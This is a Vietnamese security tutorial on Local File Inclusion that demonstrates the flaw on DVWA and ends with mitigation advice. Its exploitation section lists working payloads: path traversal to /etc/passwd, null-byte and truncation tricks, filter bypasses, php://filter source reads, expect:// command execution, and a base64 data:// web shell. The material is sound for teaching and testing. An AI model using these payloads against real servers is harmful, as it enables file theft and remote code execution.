# Local File Inclusion(LFI) - Bao gồm tệp cục bộ
## 1. Sơ lược
Local File Inclusion(LFI) là một lỗ hổng trong ứng dụng web cho phép kẻ tấn công đưa vào một tệp đã tồn tại trên máy chủ thông qua đường dẫn có sử dụng cơ chế bao gồm tập tin động(dynamic file inclusion) mà không xem xét nó là đầu vào đáng tin cậy hay không. Tệp này có thể là tệp hệ thống nhạy cảm, tệp cấu hình hoặc bất kỳ tệp nào khác mà kẻ tấn công có thể đọc được. Bằng cách bao gồm tệp này, kẻ tấn công có thể đọc nội dung của nó, có thể chứa thông tin nhạy cảm như mật khẩu hoặc dữ liệu bí mật khác.
## 2. Làm sao nhận biết web có lỗ hổng LFI
Để biết liệu một trang web có lỗ hổng LFI hay không, chúng ta có thể thực hiện đánh giá lỗ hổng hoặc kiểm tra thâm nhập trên trang web bằng các công cụ tự động như trình quét lỗ hổng hoặc thủ công bằng cách thử truy cập các tệp cục bộ trên máy chủ bằng cách thao tác các tham số đầu vào của ứng dụng.

Ở đây chúng ta sẽ lấy DVWA để thử.

Khi bắt đầu, chúng ta thấy trang web có ba liên kết đến file1.php, file2.php và file3.php
Bấm các trang. Có vẻ như điều duy nhất thay đổi là tham số trang. Khi nhấp vào từng liên kết, trang sẽ thay đổi tương ứng. Hãy bắt đầu kiểm tra lỗ hổng LFI như sau:
```powershell
http://192.168.0.101/dvwa/vulnerabilities/fi/?page=file4.php
```
Và file4.php hiện ra, cho chúng ta biết khả năng có lỗ hổng LFI ở đây
Để chắc chắn hơn chúng ta có thể thử thêm vài thứ
```powershell
http://192.168.0.101/dvwa/vulnerabilities/fi/?page=https://google.com
```
Bùm, trang google đã được chèn thêm vào trang web
## 3. Cách thức khai thác
Khai thác LFI khá giống với Directory & Path Traversal

Ở đây chúng ta thêm `../ ` để trở lại các thư mục trước đó và thêm `etc/passwd` là file cần tìm
```powershell
http://192.168.0.101/dvwa/vulnerabilities/fi/?page=../../../etc/passwd
```
Nếu may mắn thì chúng ta sẽ thấy dc thứ sau đây
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```
Chú ý: Số lượng ```../``` phụ thuộc vào nơi server được đặt ở đâu trong cây thư mục

#### Null byte Injection
Ở các phiên bản PHP dưới 5.3.4, chúng ta có thể kết thúc bằng byte rỗng.
```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```
#### Path and dot truncation
Trên hầu hết các bản cài đặt PHP, tên tệp dài hơn 4096 byte sẽ bị cắt bớt nên phần dư ra sẽ bị loại bỏ
```powershell
http://example.com/index.php?page=../../../etc/passwd............[thêm nữa]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[thêm nữa]
http://example.com/index.php?page=../../../etc/passwd/./././././.[thêm nữa] 
http://example.com/index.php?page=../../../[thêm nữa]../../../../etc/passwd
```
#### Filter bypass tricks
Một số trang có hệ thống lọc như  `str_replace( array( "../", "..\\" ), "", $file )` hoặc `strpos($file, '../..')` Chúng ta có thể "hack" nó như sau:
```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=.././.././etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```
#### Sử dụng wrappers
1. Wrapper php://filter
- Phần "`php://filter`" không phân biệt hoa, thường
```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```
Wrapper có thể được xâu chuỗi bằng trình bao bọc nén cho các tệp lớn.
```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```
Chú ý: Wrapper có thể xâu chuỗi để thực hiện nhiều lệnh bằng cách sử dụng `|` or `/`
- Base64 giải mã nhiều lần: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=`
- Nén và mã hóa (hữu dụng khi bị giới hạn chữ): `php://filter/zlib.deflate/convert.base64-encode/resource=`
2. Wrapper expect://
```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
3. Wrapper data://
```powershell
http://example.com/page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
Chú ý: payload là "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

## 4. Hậu quả
Điều này có thể dẫn đến điều gì đó như xuất nội dung của tệp, nhưng tùy thuộc vào mức độ nghiêm trọng, nó cũng có thể dẫn đến:

- Thực thi mã trên máy chủ web(RCE)

- Thực thi mã ở phía máy khách, chẳng hạn như JavaScript

- Cross-site scripting (XSS)

- Từ chối dịch vụ (DoS)

- Tiết lộ thông tin nhạy cảm như thông tin người dùng, mật khẩu...
## 5. Cách ngăn chặn, hạn chế
- Xác thực đầu vào: Đảm bảo rằng tất cả đầu vào của người dùng được xác thực một cách cẩn thận để ngăn kẻ tấn công khai thác lỗ hổng. Hoặc tránh bao gồm động các tệp dựa trên đầu vào của người dùng. Nên duy trì một danh sách trắng các tệp có thể được phép truy cập

- Phân quyền file: Đảm bảo rằng cách phân quyền của hệ thống tệp được thiết lập chính xác để người dùng trái phép không thể đọc được các tệp nhạy cảm.

- Hạn chế quyền truy cập: Giới hạn quyền truy cập vào các tệp nhạy cảm bằng cách đặt chúng vào một thư mục riêng với quyền truy cập bị hạn chế và đảm bảo rằng máy chủ web không thể truy cập các thư mục cha.

- Tường lửa: Định cấu hình tường lửa để chặn lưu lượng truy cập đến từ các nguồn không đáng tin cậy để ngăn kẻ tấn công truy cập vào máy chủ thông qua lỗ hổng LFI.

- Luôn cập nhật: Luôn cập nhật ứng dụng web và phần mềm máy chủ với các bản sửa lỗi và bản vá bảo mật mới nhất.
